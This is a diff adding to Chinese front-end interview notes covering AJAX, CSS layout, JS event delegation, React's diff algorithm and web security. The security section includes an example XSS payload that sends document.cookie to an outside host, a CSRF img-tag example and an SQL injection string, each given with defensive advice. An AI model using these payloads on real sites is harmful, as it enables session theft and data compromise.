@@ -168,7 +168,8 @@ HTML5 增加了一个选项，可将脚本标记为异步，以便由其他线�
  2. 只支持HTTP请求中的GET方式
  3. 老式浏览器全部支持
  4. 需要服务端支持
- 5. 协作上多了一层沟通
+ 5. 前后端强制耦合, 协作上多了一层沟通
+ 6. 判断请求成功失败比较棘手, 可以设置响应时间
 
 **例子:**
 ```
@@ -272,6 +273,61 @@ Access-Control-Expose-Headers: FooBar
 
 在有自己服务器做中间层情况下使用反向代理/CORS(跨域资源共享)
 在无权改变目标服务器, 又没有自己服务器做中间层, 使用jsonp/网络代理等方式
+
+### AJAX
+
+
+```
+<script type="text/javascript" language="javascript">
+    function makeRequest(url) {
+        var httpRequest;
+
+        if (window.XMLHttpRequest) { // Mozilla, Safari, ...
+            httpRequest = new XMLHttpRequest();
+            if (httpRequest.overrideMimeType) {
+                httpRequest.overrideMimeType('text/xml');
+            }
+        }
+        else if (window.ActiveXObject) { // IE
+            try {
+                httpRequest = new ActiveXObject("Msxml2.XMLHTTP");
+            }
+            catch (e) {
+                try {
+                    httpRequest = new ActiveXObject("Microsoft.XMLHTTP");
+                }
+                catch (e) {}
+            }
+        }
+
+        if (!httpRequest) {
+            alert('Giving up :( Cannot create an XMLHTTP instance');
+            return false;
+        }
+        httpRequest.onreadystatechange = function() { alertContents(httpRequest); };
+        httpRequest.open('GET', url, true);
+        httpRequest.send('');
+
+    }
+
+    function alertContents(httpRequest) {
+
+        if (httpRequest.readyState == 4) {
+            if (httpRequest.status == 200) {
+                alert(httpRequest.responseText);
+            } else {
+                alert('There was a problem with the request.');
+            }
+        }
+
+    }
+</script>
+<span
+    style="cursor: pointer; text-decoration: underline"
+    onclick="makeRequest('test.html')">
+        Make a request
+</span>
+```
 
 ### 前端性能优化相关问题
 
@@ -997,18 +1053,201 @@ test();
 大数据 + 前端可视化
 
 * 大数据, NOSQL
-* 整个数据信息展示路径清晰, 数据结构非常重要, 前后端统一标准
+* 理解产品需求, 整个数据信息展示路径清晰, 数据结构非常重要, 前后端统一标准
 * 了解数据结构, 熟悉数组对象的操作, 将一个或多个api的数据进行整合
 * 前端可视化, 就是数据的具体表现形式, 可以是柱状图/饼图/折现图, 也可以是热力图/关系图/飞行图
-* 用到的前端工具的话, echarts/react/three.js
+* 用到的前端工具的话, echarts/react/ichart/three.js
 * echarts 比较推荐, 底层是canvas, 性能流畅度比较高, 交互性也比较好, 移动支持, 生态圈大, 文档全, 可拓展性好
 * D3 直接对 DOM 进行操作
+* 数据是用来帮助用户做决策的, 增加一些分析工具
+
+### css布局
+
+* 使用float, boostrap源码中的栅格系统, 
+```
+.row:before,
+.row:after {
+  display: table;
+  content: " ";
+}
+.row {
+  margin-right: -15px;
+  margin-left: -15px;
+}
+.col-xs-1, .col-sm-1, .col-md-1, .col-lg-1 {
+  position: relative;
+  min-height: 1px;
+  padding-right: 15px;
+  padding-left: 15px;
+}
+.col-xs-1, .col-xs-2, .col-xs-3 {
+  float: left;
+}
+.col-xs-1 {
+  width: 8.33333333%;
+}
+.col-xs-12 {
+  width: 100%;
+}
+```
+* 使用[flexbox][flexbox-ruan], 在caniuse里可以查看浏览器兼容性
+```
+.box{
+  display: flex; //inline-flex;
+  flex-direction: row | row-reverse | column | column-reverse;
+  flex-wrap: nowrap | wrap | wrap-reverse;
+  //flex-flow: <flex-direction> || <flex-wrap>;
+  justify-content: flex-start | flex-end | center | space-between | space-around;
+  align-items: flex-start | flex-end | center | baseline | stretch;
+  align-content: flex-start | flex-end | center | space-between | space-around | stretch;
+}
+
+.item {
+  order: <integer>; //属性定义项目的排列顺序。数值越小，排列越靠前，默认为0
+  flex-grow: <number>; //定义项目的放大比例，默认为0，即如果存在剩余空间，也不放大
+  flex-shrink: <number>; //属性定义了项目的缩小比例，默认为1，即如果空间不足，该项目将缩小
+  flex-basis: <length> | auto; //定义了在分配多余空间之前，项目占据的主轴空间（main size）
+  //flex: none | [ <'flex-grow'> <'flex-shrink'>? || <'flex-basis'> ]
+  align-self: auto | flex-start | flex-end | center | baseline | stretch; //允许单个项目有与其他项目不一样的对齐方式
+
+}
+```
+* 使用display/position设置 
+```
+.box {
+  display: block; 
+}
+.item {
+  display: inline-block; 
+  width: 25%; 
+}
+```
+
+xmlhttprequest
 
 
 
-### js基础问题
+
+### 前端安全
+
+常见攻击手段
+
+* xss( cross-site scripting),跨域脚本攻击
+  > `book.com/search?name=<script>document.location='http://vajoy/get?cookie='+document.cookie</script>`
+  > 提供的免费wifi, 邮件, 链接
+  > 对于XSS的预防自然也是对提交数据的过滤，另外还有一点——谨慎返回用户提交的内容！
+  > 不要相信 任何 来自用户的输入（不仅限于 POST Body/QueryString/payload，甚至是 Headers）
+* CSRF (Cross-site request forgery), 跨站点伪造攻击
+  > a.com  `<a href="http://a.com/logout.php">登出</a>`
+  > b.com  `<img src="http://a.com/logout.php">`
+  > 给所有请求加上 token 检查。token 一般是随机字符串，只需确保其不可预测性即可。token 可以在 QueryString、POST body 甚至是 Custom Header 里，但千万不能在 Cookies 里。
+* SQL注入, XPath
+  > book.com/book?id=100 => book.com/book?id=100'or'1'='1
+  > 对于这几个攻击，我们需要做的自然是对提交参数的过滤，最好是前端过滤一遍，后端也过滤一遍
+* ddos(分布式拒绝服务), 
+  > cdn
+* http
+  > 明文传输
+* 重发攻击
+  > 他知道这些数据的作用，就可以在不知道数据内容的情况下通过再次发送这些数据达到愚弄接收端的目的
+  > 实现了流量攻击，即通过额外增加的数据流影响正常数据流的传输时延，耗用通信链路的带宽
+  > 加随机数/加时间戳/加流水号
+* 中间人攻击
+  > 是一种“间接”的入侵攻击，这种攻击模式是通过各种技术手段将受入侵者控制的一台计算机虚拟放置在网络连接中的两台通信计算机之间，这台计算机就称为“中间人”。
+* 网络劫持攻击
+* cookie泄露
+
+安全策略    
+
+* 压缩compression, 混淆obfuscation, 加密encryption 增加客户端代码不可读性
+* 非对称加密, 客户端的只能服务端解密
+* 哈希进行信息摘要, md5加密token等信息
+* Salt
+* cookie加密 
+* OAuth 2.0 授权
+* token 随机, 每一次的请求携带下一次请求的token
+
+### [restful api][restful-api]
+
+
+### js事件
+
+* HTML 事件可以是浏览器行为，也可以是用户行为
+* DOM2.0模型将事件处理流程分为三个阶段：一、事件捕获阶段，二、事件目标阶段，三、事件冒泡阶段
+* 在web dom编程时 js事件驱动极致
+* addEventListener(event, function, useCapture)
+* 向原元素添加/删除事件句柄
+  > element.addEventListener("click", function(){ alert("Hello World!"); });
+  > element.removeEventListener("mousemove", myFunction);
+* 向同一个元素中添加多个事件句柄
+  ```
+  element.addEventListener("mouseover", myFunction);
+  element.addEventListener("click", mySecondFunction);
+  element.addEventListener("mouseout", myThirdFunction);
+  ```
+* 事件传递有两种方式：冒泡与捕获
+* 在 冒泡 中，内部元素的事件会先被触发，然后再触发外部元素，即： <p> 元素的点击事件先触发，然后会触发 <div> 元素的点击事件。
+* 在 捕获 中，外部元素的事件会先被触发，然后才会触发内部元素的事件，即： <div> 元素的点击事件先触发 ，然后再触发 <p> 元素的点击事件。
+* 事件委托
+  1. 管理的函数变少了。不需要为每个元素都添加监听函数。对于同一个父节点下面类似的子元素，可以通过委托给父元素的监听函数来处理事件。
+  2. 可以方便地动态添加和修改元素，不需要因为元素的改动而修改事件绑定。
+  3. JavaScript和DOM节点之间的关联变少了，这样也就减少了因循环引用而带来的内存泄漏发生的概率。
+* 当我们需要对很多元素添加事件的时候，可以通过将事件添加到它们的父节点而将事件委托给父节点来触发处理函数, 这主要得益于浏览器的事件冒泡机制
+```
+<ul id="parent-list">
+  <li id="post-1">Item 1</li>
+  <li id="post-2">Item 2</li>
+  <li id="post-3">Item 3</li>
+  <li id="post-4">Item 4</li>
+  <li id="post-5">Item 5</li>
+  <li id="post-6">Item 6</li>
+</ul>
+
+function addListeners4Li(liNode){
+    liNode.onclick = function clickHandler(){...};
+    liNode.onmouseover = function mouseOverHandler(){...}
+}
+
+window.onload = function(){
+    var ulNode = document.getElementById("parent-list");
+    var liNodes = ulNode.getElementByTagName("Li");
+    for(var i=0, l = liNodes.length; i < l; i++){
+        addListeners4Li(liNodes[i]);
+    }   
+}
+
+// 获取父节点，并为它添加一个click事件
+document.getElementById("parent-list").addEventListener("click",function(e) {
+  // 检查事件源e.targe是否为Li
+  if(e.target && e.target.nodeName.toUpperCase == "LI") {
+    // 真正的处理过程在这里
+    console.log("List item ",e.target.id.replace("post-")," was clicked!");
+  }
+});
+```
+
+
 ### react 源码解析
-### for 循环原理
+
+#### 项目架构
+从目录结构看出, 它是一个典型的大厂项目
+项目分模块开发, 每一个模块都有自己的测试用例
+官方文档也在这里面, 托管在github主机上, 可持续化集成
+项目同时会发布 react/react-dom/react-native/react-art
+里面代码的规范性写法对我启发颇多
+
+#### components 组件
+
+#### diff 算法
+
+[diff算法][react-diff-zhihu]
+
+* React 通过制定大胆的 diff 策略，将 O(n3) 复杂度的问题转换成 O(n) 复杂度的问题；
+* React 通过分层求异的策略，对 tree diff 进行算法优化；
+* React 通过相同类生成相似树形结构，不同类生成不同树形结构的策略，对 component diff 进行算法优化；
+* React 通过设置唯一 key的策略，对 element diff 进行算法优化；
+* 建议，在开发组件时，保持稳定的 DOM 结构会有助于性能的提升；
+* 建议，在开发过程中，尽量减少类似将最后一个节点移动到列表首部的操作，当节点数量过大或更新操作过于频繁时，在一定程度上会影响 React 的渲染性能。
 
 
 [ulr-happen]:http://fex.baidu.com/blog/2014/05/what-happen/
@@ -1024,5 +1263,8 @@ test();
 [prototype]:https://www.zhihu.com/question/34183746
 [design-patterns]:http://www.cnblogs.com/Darren_code/archive/2011/08/31/JavascripDesignPatterns.html#!comments
 [sorts]:https://github.com/damonare/Sorts
-
+[react-diff-zhihu]:http://zhuanlan.zhihu.com/purerender/20346379
+[flexbox]:https://css-tricks.com/snippets/css/a-guide-to-flexbox/
+[flexbox-ruan]:http://www.ruanyifeng.com/blog/2015/07/flex-grammar.html
+[restful-api]:http://www.ruanyifeng.com/blog/2014/05/restful_api.html
 
